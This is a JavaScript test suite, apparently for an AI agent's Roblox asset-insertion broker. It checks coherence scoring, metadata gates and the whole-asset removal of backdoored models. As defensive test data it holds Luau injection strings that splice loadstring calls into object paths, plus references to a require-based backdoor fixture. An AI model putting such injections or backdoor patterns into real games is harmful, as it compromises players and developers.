  const frostCtx = A.buildPaletteContext('frost', [{ dominantColours: [[0.45, 0.85, 0.20]], triangles: 300, hasTexture: false, boundsStuds: [4, 4, 4], intent: 'bush' }]);
  const v = A.scoreAssetCoherence({ name: 'Lime Bush', intent: 'bush', triangles: 300, hasTexture: false, dominantColours: [[0.45, 0.85, 0.20]], boundsStuds: [4, 4, 4] }, frostCtx);
  assert.equal(v.verdict, 'incoherent', 'one contaminant already present must not licence the next one');
});

test('CULL AGGRESSIVELY: cullPalette sorts a mixed set into keep / transform / drop', () => {
  const mixed = [
    ...MEADOW_SET,
    { assetId: 31, name: 'Scanned Granite Boulder', intent: 'rock', triangles: 40000, hasTexture: false, dominantColours: [[0.66, 0.70, 0.72]], boundsStuds: [4, 3, 4] },
    { assetId: 32, name: 'Fence', intent: 'fence', triangles: 240, hasTexture: false, dominantColours: [[0.58, 0.58, 0.59]], boundsStuds: [8, 6, 1] },
    { assetId: 33, name: 'Textured Shrub', intent: 'bush', triangles: 260, hasTexture: true, dominantColours: [[0.30, 0.68, 0.33]], boundsStuds: [4, 4, 4] },
  ];
  const { keep, transform, drop } = A.cullPalette(mixed, 'meadow');
  const ids = (rows) => rows.map((r) => r.member.assetId).sort((a, b) => a - b);
  assert.ok(ids(drop).includes(31), `the 40k boulder must be culled: ${JSON.stringify(ids(drop))}`);
  assert.ok(ids(drop).includes(33), 'the textured shrub must be culled');
  assert.ok(ids(transform).includes(32), 'the grey fence is fixable, not culled');
  assert.equal(keep.length + transform.length + drop.length, mixed.length, 'every member is accounted for exactly once');
});

test('a transform is EXPRESSIBLE as safe Luau, and fails closed on a hostile path', () => {
  const retint = { kind: 'retint', instruction: 'x', colour: [0.3, 0.7, 0.35], repairs: ['palette'], projectedTotal: 80 };
  const code = A.buildTransformLuau('game.Workspace.Fence', retint);
  assert.match(code, /Color3\.new\(0\.3000, 0\.7000, 0\.3500\)/);
  assert.match(code, /p\.Color = tint/);
  assert.equal(A.buildTransformLuau('game.Workspace["a"] end; loadstring("x")() --', retint), null);
  assert.equal(A.buildTransformLuau('game.Workspace.Fence', { ...retint, colour: [0.3, NaN, 0.35] }), null);
  const rescale = { kind: 'rescale', instruction: 'x', scale: 4.5, repairs: ['scale_tier'], projectedTotal: 80 };
  assert.match(A.buildTransformLuau('game.Workspace.Tree', rescale), /ScaleTo\(4\.5000\)/);
  assert.equal(A.buildTransformLuau('game.Workspace.Tree', { ...rescale, scale: 500 }), null, 'an absurd scale yields no code at all');
  assert.match(A.buildTransformLuau('game.Workspace.Bush', { kind: 'drop_texture', instruction: 'x', repairs: ['texture'], projectedTotal: 80 }), /TextureID = ""/);
});

test('every coherence axis carries a weight, the weights sum to 1, and every axis states a reason', () => {
  const v = A.scoreAssetCoherence(COHERENT_BUSH, meadow());
  assert.deepEqual(v.axes.map((a) => a.axis).sort(), [...A.COHERENCE_AXES].sort());
  const sum = v.axes.reduce((a, x) => a + x.weight, 0);
  assert.ok(Math.abs(sum - 1) < 1e-9, `weights summed to ${sum}`);
  for (const a of v.axes) {
    assert.ok(a.reason.length > 10, `${a.axis} has no reason`);
    assert.ok(a.score >= 0 && a.score <= 1, `${a.axis} out of range`);
  }
});

test('the frost biome forbids living green and the meadow does not — the band is the biome\'s, not global', () => {
  assert.equal(A.BIOME_PROFILES.frost.forbidden.length, 1);
  assert.equal(A.BIOME_PROFILES.meadow.forbidden.length, 0);
  assert.match(A.BIOME_PROFILES.frost.forbidden[0].why, /another map/i);
  // Frost's own pine green is desaturated enough to sit outside its own band, or the biome would
  // be forbidding its own palette.
  const pine = A.BIOME_PROFILES.frost.palette.find((c) => c[1] > c[0] && c[1] > c[2]);
  assert.ok(pine, 'frost has a green in its palette');
  const v = A.scoreAssetCoherence({ name: 'Frost Pine', intent: 'tree', triangles: 300, hasTexture: false, dominantColours: [pine], boundsStuds: [10, 20, 10] }, frost());
  assert.ok(!v.blockers.some((b) => /contamination/i.test(b)), `frost must not forbid its own palette: ${v.blockers.join(' | ')}`);
});

// ==============================================================================================
// 4. Pipeline plumbing: describe, creator, path safety, normalisation, tree
// ==============================================================================================

test('describe strips filler and infers the decision-table row', () => {
  const d = describeAssetRequest({ description: 'can you please add a nice low poly oak tree for my park' });
  assert.equal(d.need, 'foliage');
  assert.equal(/\b(?:can|you|please|a|for|my)\b/.test(d.query), false, `filler survived: ${d.query}`);
  assert.match(d.query, /tree/);
});

test('an untrusted creator is not acceptable, and Roblox itself is trusted by construction', () => {
  const base = { creator: { id: 55, name: 'someone', isVerifiedCreator: false }, isEndorsed: false, upVotePercent: 90, voteCount: 40 };
  assert.equal(inspectCreator(base).acceptable, false);
  assert.equal(inspectCreator({ ...base, creator: { id: 1, name: 'Roblox', isVerifiedCreator: false } }).trust, 'roblox');
  assert.equal(inspectCreator({ ...base, creator: { ...base.creator, isVerifiedCreator: true } }).trust, 'verified');
  assert.equal(inspectCreator({ ...base, isEndorsed: true }).trust, 'endorsed');
});

test('LUAU PATH INJECTION IS FAILED CLOSED — a hostile path yields no code at all', () => {
  assert.equal(isSafeLuauPath('game.Workspace.Tree'), true);
  assert.equal(isSafeLuauPath('game.Workspace["Oak Tree"]'), true);
  for (const evil of [
    'game.Workspace["a"] end; loadstring("x")() --',
    'game.Workspace["a\\"]"]',
    'game.Workspace\nprint(1)',
    'game.Workspace["a`b"]',
    '',
  ]) {
    assert.equal(isSafeLuauPath(evil), false, `should have been refused: ${JSON.stringify(evil)}`);
    assert.equal(buildNormaliseLuau({ path: evil, scale: 1, position: null, reasons: [] }), null);
  }
});

test('normalisation refuses absurd scales and non-finite positions rather than emitting them', () => {
  const p = { path: 'game.Workspace.T', reasons: [] };
  assert.equal(buildNormaliseLuau({ ...p, scale: 0, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1e9, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1, position: [0, NaN, 0] }), null);
  const good = buildNormaliseLuau({ ...p, scale: 2.5, position: [10, 0, -4] });
  assert.match(good, /ScaleTo\(2\.5000\)/);
  assert.match(good, /PivotTo\(CFrame\.new\(10\.000, 0\.000, -4\.000\)\)/);
  assert.match(good, /Anchored = true/);
});

test('the normalisation report survives the wrappers run_code puts around it', () => {
  const payload = '{"anchored":7,"scaled":2.0,"size":[3,4,3],"pos":[0,2,0]}';
  for (const wrapped of [payload, { result: payload }, { result: { t: 'string', v: payload } }, { data: { result: payload } }]) {
    const parsed = parseNormaliseResult(wrapped);
    assert.equal(parsed.anchored, 7);
    assert.deepEqual(parsed.size, [3, 4, 3]);
  }
  assert.equal(parseNormaliseResult('{"error":"target not found"}'), null);
  assert.equal(parseNormaliseResult('not json'), null);
});

test('summariseTree measures the bounding box and notices a truncated walk', () => {
  const tree = { root: { name: 'M', class: 'Model', children: [
    { name: 'A', class: 'Part', pos: [0, 2, 0], size: [4, 4, 4] },
    { name: 'B', class: 'Part', pos: [10, 2, 0], size: [2, 2, 2] },
  ] } };
  const s = summariseTree(tree);
  assert.deepEqual(s.classes, ['Model', 'Part', 'Part']);
  assert.deepEqual(s.bounds, [13, 4, 4]);
  assert.equal(s.truncated, false);
  assert.equal(summariseTree({ root: { name: 'M', class: 'Model', moreChildren: 40 } }).truncated, true);
});

// ==============================================================================================
// 5. The broker end to end, against a fake Studio and a fake Creator Store
// ==============================================================================================

const HIT = (id, name) => ({ asset: { id, name, typeId: 40 }, creator: { id: 1, name: 'Roblox' }, fiatProduct: { isFree: true } });

const DETAILS = (id, name, extra = {}) => ({
  data: [
    {
      asset: { id, name, typeId: 40, hasScripts: false, scriptCount: 0, visibilityStatus: 1, capabilities: {}, modelTechnicalDetails: { objectMeshSummary: { triangles: 800, vertices: 500 } }, ...extra },
      creator: { id: 1, name: 'Roblox', isVerifiedCreator: true },
      voting: { upVotePercent: 96, voteCount: 400 },
      fiatProduct: { isFree: true, purchasable: true },
    },
  ],
});

/** Records every URL asked for, so a test can prove nothing real was contacted. */
function fakeStore(details = DETAILS(101, 'Low Poly Crate')) {
  const urls = [];
  const fetchImpl = async (url) => {
    urls.push(url);
    if (url.includes('marketplace') || url.includes('assets:search')) {
      return { ok: true, status: 200, json: async () => ({ data: [HIT(101, 'Low Poly Crate')] }) };
    }
    return { ok: true, status: 200, json: async () => details };
  };
  return { fetchImpl, urls };
}

/**
 * A fake Studio. `scripts` is the hierarchy the plugin will report AFTER insertion — i.e. what the
 * metadata gate could not see. Deletions actually mutate it, so `verify` is a real re-read.
 */
function fakeStudio({ scripts = [], classes = ['Model', 'MeshPart'], failOn = null, size = [4, 4, 4], colours = [] } = {}) {
  const state = { scripts: scripts.slice(), deleted: [], calls: [] };
  const bridge = {
    async execStudioOp(op) {
      state.calls.push(op.op);
      if (failOn === op.op) return { ok: false, error: `fake failure on ${op.op}` };
      switch (op.op) {
        case 'insert_asset':
          return { ok: true, data: { inserted: ['game.Workspace.Crate'] } };
        case 'get_tree':
          return { ok: true, data: { root: { name: 'Crate', class: classes[0], pos: [0, size[1] / 2, 0], size, children: classes.slice(1).map((c, i) => ({ name: `C${i}`, class: c })) } } };
        case 'list_scripts':
          return { ok: true, data: { scripts: state.scripts.map((s) => ({ path: s.path, class: s.className })) } };
        case 'read_script': {
          const found = state.scripts.find((s) => s.path === op.path);
          return found && found.source !== null ? { ok: true, data: { source: found.source } } : { ok: false, error: 'unreadable' };
        }
        case 'delete_instances':
          state.deleted.push(...op.paths);
          state.scripts = state.scripts.filter((s) => !op.paths.includes(s.path) && !op.paths.some((p) => s.path.startsWith(p + '.')));
          return { ok: true, data: { deleted: op.paths } };
        case 'run_code':
          // The normalisation snippet now reports the colours it measured while anchoring, because
          // the coherence gate cannot refuse a grey prop it was never told the colour of.
          return { ok: true, data: { result: `{"anchored":3,"scaled":0,"size":[${size.join(',')}],"pos":[0,${size[1] / 2},0],"colours":${JSON.stringify(colours)}}` } };
        default:
          return { ok: true, data: {} };
      }
    },
  };
  return { bridge, state };
}

test('THE HAPPY PATH: a clean asset walks the whole pipeline in order and ends verified', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  const order = r.steps.map((s) => s.step);
  assert.deepEqual(order, BROKER_STEPS.slice(), 'every step must run, in the declared order');
  assert.equal(r.scan.verdict, 'clean');
  assert.equal(r.chosen.assetId, 101);
  // The order that matters: the hierarchy is never read before it exists, and never after it is used.
  assert.ok(studio.state.calls.indexOf('insert_asset') < studio.state.calls.indexOf('list_scripts'));
});

test('A BACKDOORED MODEL THAT PASSED THE METADATA GATE IS DELETED, WHOLE, AFTER INSERTION', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Main', className: 'Script', source: REQUIRE_BACKDOOR }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'scan_scripts');
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'the whole asset goes, not just the script');
  assert.match(r.summary, /backdoor/i);
});

test('a plain script is stripped and the place is PROVEN clean by re-reading it', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  assert.deepEqual(r.removed, ['game.Workspace.Crate.Spin']);
  assert.equal(r.scan.verdict, 'stripped');
  // verify re-lists AFTER the delete; the fake actually removed the row, so this is a real proof.
  assert.equal(studio.state.calls.filter((c) => c === 'list_scripts').length, 2);
});

test('an HTTP-calling script that survives the metadata gate causes a whole-asset discard', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Beacon', className: 'Script', source: HTTP_SCRIPT }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a script whose source cannot be read discards the asset rather than assuming it is fine', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Hidden', className: 'Script', source: null }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a failed post-removal listing is a refusal, because the place cannot be proven clean', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ failOn: 'list_scripts' });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.ok(['scan_scripts', 'verify'].includes(r.aborted.step), r.aborted.step);
});

test('a script-bearing asset never reaches Studio when the METADATA already says so', async () => {
  const store = fakeStore(DETAILS(101, 'Crate', { hasScripts: true, scriptCount: 2 }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(studio.state.calls.length, 0, 'nothing may touch the place when the gate already refused');
  assert.equal(r.considered[0].verdict, 'fail_has_scripts');
});

test('the style gate can refuse a perfectly safe asset — valid is not the same as right', async () => {
  const store = fakeStore(DETAILS(101, 'Photorealistic PBR Scanned Crate 4K', { modelTechnicalDetails: { objectMeshSummary: { triangles: 90000, vertices: 60000 } } }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(r.considered[0].verdict, 'pass', 'it passed every SAFETY assertion');
  assert.equal(r.considered[0].style.verdict, 'reject', 'and still lost on style');
  assert.equal(studio.state.calls.length, 0);
});

test('the decision table has the last word: a need it never routes to the store is refused first', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a big house', need: 'building' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'describe');
  assert.equal(store.urls.length, 0, 'no request may be made for a need the table refuses');
});

test('dryRun stops at select and never touches the place', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl, dryRun: true });
  assert.equal(r.ok, true);
  assert.equal(studio.state.calls.length, 0);
  assert.deepEqual(r.steps.map((s) => s.step).slice(-1), ['select']);
});

test('NO NETWORK: every URL the broker asked for went to the injected fake', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.ok(store.urls.length > 0, 'the broker must have gone through the injected fetch');
  for (const u of store.urls) assert.match(u, /^https:\/\/apis\.roblox\.com\//, u);
});

// --- the coherence gate at the PIPELINE level -----------------------------------------------
// §3B proves the gate works. These three prove it RUNS — the exact distinction that let the script
// scanner ship with 47 green tests and zero call sites. If the `coherence` step is ever unwired
// from `brokerAsset`, §3B stays green and these fail.

test('THE COHERENCE GATE RUNS IN THE PIPELINE: it is a step, and it reports against the palette', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ colours: [[0.79, 0.55, 0.30]] });
  const palette = A.buildPaletteContext('meadow', MEADOW_SET);
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl, palette });
  assert.equal(r.ok, true, r.summary);
  assert.ok(BROKER_STEPS.includes('coherence'), 'coherence must be a declared step, not an ad-hoc call');
  assert.ok(r.steps.some((st) => st.step === 'coherence'), 'the step must actually have run');
  assert.equal(r.coherence.verdict, 'coherent', A.coherenceToText(r.coherence));
  assert.equal(r.coherence.contextSize, MEADOW_SET.length, 'it must judge against the palette it was given, not a default');
  // The colours came out of the normalisation pass, which is the only reason the gate has teeth.
  assert.deepEqual(r.normalisation.colours, [[0.79, 0.55, 0.30]]);
});

test('AN INCOHERENT ASSET IS DISCARDED FROM THE PLACE, exactly like an unsafe one', async () => {
  const store = fakeStore();
  // A lime-green tree, inserted into a frost biome. Safe, on-style, and from another map.
  const studio = fakeStudio({ size: [10, 22, 10], colours: [[0.45, 0.85, 0.20]] });
  const palette = A.buildPaletteContext('frost', [
    { triangles: 800, hasTexture: false, dominantColours: [[0.75, 0.90, 0.96]], boundsStuds: [10, 20, 10], intent: 'tree' },
  ]);
  const r = await brokerAsset({}, { description: 'a low poly pine tree', intent: 'tree' }, studio.bridge, { fetchImpl: store.fetchImpl, palette });
  assert.equal(r.ok, false, r.summary);
  assert.equal(r.aborted.step, 'coherence');
  assert.match(r.summary, /contamination/i);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'an asset that does not belong is removed, not left standing');
});

test('a TRANSFORMABLE asset is kept and the fix is applied in the place, not just described', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ size: [8, 6, 1], colours: [[0.58, 0.58, 0.59]] });
  const palette = A.buildPaletteContext('meadow', MEADOW_SET);
  const r = await brokerAsset({}, { description: 'a wooden fence', intent: 'fence' }, studio.bridge, { fetchImpl: store.fetchImpl, palette, applyTransform: true });
  assert.equal(r.ok, true, r.summary);
  assert.equal(r.coherence.verdict, 'transform');
  assert.equal(r.transformApplied.kind, 'retint');
  assert.deepEqual(studio.state.deleted, [], 'a fixable asset is fixed, not culled');
  // Two run_code calls: the normalisation pass, then the retint. The second one is the fix landing.
  assert.equal(studio.state.calls.filter((c) => c === 'run_code').length, 2);
});

test('without applyTransform the fix is REPORTED and not silently performed', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ size: [8, 6, 1], colours: [[0.58, 0.58, 0.59]] });
  const palette = A.buildPaletteContext('meadow', MEADOW_SET);
  const r = await brokerAsset({}, { description: 'a wooden fence', intent: 'fence' }, studio.bridge, { fetchImpl: store.fetchImpl, palette });
  assert.equal(r.ok, true, r.summary);
  assert.equal(r.transformApplied, null);
  assert.match(r.steps.find((st) => st.step === 'coherence').detail, /needs a retint/);
  assert.equal(studio.state.calls.filter((c) => c === 'run_code').length, 1);
});

test('the broker never throws — a Studio that fails every op is a refusal with an audit trail', async () => {
  const store = fakeStore();
  const bridge = { async execStudioOp() { return { ok: false, error: 'studio is on fire' }; } };
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'insert');
  assert.ok(r.steps.length >= 6, 'the trail up to the failure must survive');
  assert.match(r.summary, /REFUSED at insert/);
});

// ==============================================================================================
// 6. The LIVE call site: tools.insert_asset
//
// Everything above proves the scanner works. None of it proved the scanner RUNS. Until this
// section existed, `brokerAsset` and `scanInsertedHierarchy` had zero call sites and `insert_asset`
// inserted on the metadata gate alone — so a hostile asset whose metadata lied was inserted, kept,
// and never read back. These tests drive the real dispatcher, so they fail the day the wiring is
// removed rather than the day the scanner is.
//
// NO NETWORK: `globalThis.fetch` is replaced at module scope, before the first test, and the
// closing test pins every host it was asked for.
// ==============================================================================================

/** Every URL the worker asked for, for the whole section. Never reset. */
const fetched = [];
let respond = () => {
  throw new Error('a test made a request without configuring a stub');
};
globalThis.fetch = async (url) => {
  fetched.push(String(url));
  return respond(String(url));
};

/**
 * A details payload the metadata gate accepts, with every group overridable and any field
 * removable — `omit` is how the "the endpoint stopped reporting hasScripts" case is expressed,
 * because setting it to `undefined` is not the same shape as never sending it.
 */
function detailsFor(id, { asset = {}, creator = {}, voting = {}, fiatProduct = {}, omit = [] } = {}) {
  const a = {
    id,
    name: 'Low Poly Crate',
    typeId: 40,
    hasScripts: false,
    scriptCount: 0,
    visibilityStatus: 1,
    capabilities: {},
    modelTechnicalDetails: { objectMeshSummary: { triangles: 800, vertices: 500 } },
    ...asset,
  };
  for (const key of omit) delete a[key];
  return {
    data: [
      {
        asset: a,
        creator: { id: 1, name: 'Roblox', isVerifiedCreator: true, ...creator },
        voting: { upVotePercent: 96, voteCount: 400, ...voting },
        fiatProduct: { isFree: true, purchasable: true, ...fiatProduct },
      },
    ],
  };
}

/** Answer every details lookup with one body, and record nothing else. */
function serveDetails(body) {
  respond = () => ({ ok: true, status: 200, json: async () => body });
}

/**
 * An AgentCtx over the fake Studio above. `library` is what search_asset_library would have added.
 *
 * `assetSources` IS A PRECONDITION OF THIS SECTION, NOT A DETAIL OF IT. An absent policy allows
 * nothing — `allowedSources(undefined)` is `[]` by deliberate design in asset-policy.ts — so
 * `insert_asset` short-circuits on `sourceRefusal` before a single byte of the safety pipeline
 * runs. Thirteen tests in this section were therefore asserting on the sentence "this project has
 * not been asked which asset sources it may use", while every line they were written to defend —
 * the whole-asset removal, the post-strip re-list, the narrow library waiver, the absent-hasScripts
 * refusal — went unexecuted. A consent gate in front of a safety gate makes the safety gate
 * unmeasurable; a project whose owner HAS answered is the only state in which these questions can
 * be asked at all, and it is the state every one of them describes.
 *
 * Overridable, so a test that wants to watch the refusal itself can pass its own policy.
 * security.test.mjs:769 pins the same precondition for the same reason.
 */
function toolCtx(studio, {
  discovered = [],
  library = [],
  assetSources = { mode: 'remember', allow: ['apple_library', 'creator_store', 'from_scratch'] },
} = {}) {
  return {
    env: {},
    studioConnected: () => true,
    execStudioOp: (op, timeoutMs) => studio.bridge.execStudioOp(op, timeoutMs),
    createCheckpoint: async () => ({ error: 'checkpoints are not part of this path' }),
    addMemoryFact: async () => {},
    discoveredAssetIds: new Set(discovered),
    libraryAssetIds: new Set(library),
    assetSources,
  };
}

const insert = async (ctx, assetId, parent = 'game.Workspace') => {
  const out = await T.runTool(ctx, 'insert_asset', JSON.stringify({ assetId, parent }));
  return { ...out, result: JSON.parse(out.resultForLlm) };
};

test('A BACKDOORED ASSET THAT REACHES insert_asset IS REMOVED WHOLE AND THE TOOL REFUSES', async () => {
  // The metadata swears there are no scripts. There is a `require(3163717554)` in the place.
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: [{ path: 'game.Workspace.Crate.Main', className: 'Script', source: REQUIRE_BACKDOOR }],
    classes: ['Model', 'MeshPart', 'Script'],
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, false, 'a backdoored asset must be a tool failure, not a warning');
  assert.match(out.result.error, /refused and removed/);
  assert.deepEqual(out.result.removedWholeAsset, ['game.Workspace.Crate'], 'the whole asset goes, not just the script');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
  // The order is the security property: the place is read only after the insert, and the delete
  // only after the read.
  const calls = studio.state.calls;
  assert.ok(calls.indexOf('insert_asset') < calls.indexOf('list_scripts'));
  assert.ok(calls.indexOf('read_script') < calls.indexOf('delete_instances'));
  // The attacker's own Luau must not ride into the transcript.
  const blob = JSON.stringify(out);
  assert.equal(/require\(3163717554\)/.test(blob), false, 'no line of the removed source may reach the model');
  assert.equal(/a\.load\(game/.test(blob), false);
});

test('A PLAIN-SCRIPT ASSET IS STRIPPED AND THEN PROVEN CLEAN BY RE-LISTING THE PLACE', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }],
    classes: ['Model', 'MeshPart', 'Script'],
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, true, out.resultForLlm);
  assert.equal(out.result.scan, 'stripped');
  assert.deepEqual(out.result.inserted, ['game.Workspace.Crate']);
  assert.equal(out.result.stripped.length, 1);
  assert.equal(out.result.stripped[0].path, 'game.Workspace.Crate.Spin');
  assert.match(out.result.stripped[0].why, /script_present/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate.Spin'], 'only the script goes — nothing malicious happened');
  // PROOF, not bookkeeping: the second listing is a real re-read of a place the fake actually
  // mutated, so removing the delete from the fake would fail this test.
  assert.equal(studio.state.calls.filter((c) => c === 'list_scripts').length, 2);
  assert.match(out.result.proven, /zero scripts remain/);
});

test('the clean case still runs the whole sequence — a clean asset is PROVEN clean, not assumed', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, true, out.resultForLlm);
  assert.equal(out.result.scan, 'clean');
  assert.deepEqual(out.result.stripped, []);
  assert.deepEqual(studio.state.deleted, []);
  for (const required of ['insert_asset', 'get_tree', 'list_scripts']) {
    assert.ok(studio.state.calls.includes(required), `${required} must run even for a clean asset`);
  }
});

test('A LIBRARY-DISCOVERED ID IS STILL VERIFIED — membership is provenance, never a skip', async () => {
  // The recorded bypass, exactly: a library row pointing at a Model id. Under the old code this id
  // was in discoveredAssetIds, so it went straight to Studio unresolved and unscanned.
  serveDetails(detailsFor(777, { asset: { typeId: 10, name: 'Free Admin Model' } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [777], library: [777] }), 777);

  assert.equal(out.ok, false);
  assert.match(out.result.error, /was not verified/);
  assert.match(out.result.error, /Model is refused|typeId 10/);
  assert.equal(studio.state.calls.length, 0, 'nothing may touch the place when the gate refuses');
  assert.ok(fetched.some((u) => u.includes('assetIds=777')), 'the id must actually have been resolved');
});

test('a library id carrying scripts is refused on the SAME field the Creator Store path uses', async () => {
  serveDetails(detailsFor(778, { asset: { hasScripts: true, scriptCount: 3 } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [778], library: [778] }), 778);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /carries Luau/);
  assert.equal(studio.state.calls.length, 0);
});

test('the library waiver is NARROW: price, votes and creator badge are waived, and they are named', async () => {
  // A Golem-uploaded Open Use mesh: no marketplace price, no votes, no verified badge. Refusing it
  // on those would refuse the entire library, so they are waived — and the waiver is reported.
  serveDetails(
    detailsFor(779, {
      creator: { id: 4242, name: 'Golem', isVerifiedCreator: false },
      voting: { upVotePercent: 0, voteCount: 0 },
      fiatProduct: { isFree: false },
    }),
  );
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [779], library: [779] }), 779);
  assert.equal(out.ok, true, out.resultForLlm);
  assert.ok(Array.isArray(out.result.waivedForLibraryAsset) && out.result.waivedForLibraryAsset.length > 0, 'a waiver that is not reported is a waiver nobody can audit');

  // The same asset from the Creator Store gets no such waiver.
  serveDetails(
    detailsFor(779, {
      creator: { id: 4242, name: 'Someone', isVerifiedCreator: false },
      voting: { upVotePercent: 0, voteCount: 0 },
      fiatProduct: { isFree: false },
    }),
  );
  const store = fakeStudio();
  const fromStore = await insert(toolCtx(store, { discovered: [779] }), 779);
  assert.equal(fromStore.ok, false, 'only a curated-library id may waive anything');
  assert.equal(store.state.calls.length, 0);
});

test('A DETAILS RESPONSE WITH hasScripts ABSENT IS REFUSED, NOT PASSED', async () => {
  // The undocumented endpoint renames or drops the field. `undefined === true` is false, which used
  // to read as "this asset carries no scripts" and pass the most important assertion in silence.
  serveDetails(detailsFor(101, { omit: ['hasScripts'] }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, false, 'an absent field must fail closed');
  assert.match(out.result.error, /hasScripts/);
  assert.match(out.result.error, /never as false/);
  assert.equal(studio.state.calls.length, 0, 'the place is never touched on an unanswerable question');
  // Non-vacuity: the SAME fixture with the field present inserts fine, so the refusal is caused by
  // the absence and by nothing else in the payload.
  serveDetails(detailsFor(101));
  const ok = await insert(toolCtx(fakeStudio(), { discovered: [101] }), 101);
  assert.equal(ok.ok, true, ok.resultForLlm);
});

test('a non-boolean hasScripts is absence, not a value — "false" the string does not clear the gate', async () => {
  for (const bogus of ['false', 0, null, {}]) {
    serveDetails(detailsFor(101, { asset: { hasScripts: bogus } }));
    const studio = fakeStudio();
    const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
    assert.equal(out.ok, false, `hasScripts=${JSON.stringify(bogus)} should have failed closed`);
    assert.equal(studio.state.calls.length, 0);
  }
});

test('an id nobody discovered is still resolved before anything is inserted', async () => {
  serveDetails(detailsFor(999, { asset: { typeId: 10 } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio), 999);
  assert.equal(out.ok, false);
  assert.equal(studio.state.calls.length, 0);
  assert.equal(out.result.assetId, undefined);
});

test('a garbage assetId is refused without a request and without touching the place', async () => {
  const before = fetched.length;
  for (const bad of [0, -1, 1.5, 'abc']) {
    const studio = fakeStudio();
    const out = await insert(toolCtx(studio, { discovered: [0] }), bad);
    assert.equal(out.ok, false, String(bad));
    assert.equal(studio.state.calls.length, 0);
  }
  assert.equal(fetched.length, before, 'an invalid id must not reach the network');
});

test('an insert that fails half way leaves nothing behind: a failed strip discards the whole asset', async () => {
  serveDetails(detailsFor(101));
  // list_scripts works, read_script works, delete_instances does not.
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }], failOn: 'delete_instances' });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /could not be deleted/);
